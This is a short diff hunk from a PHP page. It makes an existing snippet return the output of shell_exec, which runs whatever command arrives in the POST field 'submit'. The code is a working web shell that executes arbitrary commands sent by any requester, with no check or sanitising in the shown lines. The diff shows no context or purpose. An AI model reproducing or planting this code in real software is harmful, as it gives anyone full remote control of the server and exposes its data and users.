@@ -88,8 +88,8 @@ error_reporting(E_ALL);
 
 if(isset($_POST['submit'])){
 $command = $_POST['submit'];
-echo "<h3>Executed $command</h3>";
-shell_exec("$command");
+$results = shell_exec("$command");
+echo "$results";
 }
 ?>
 		</div>
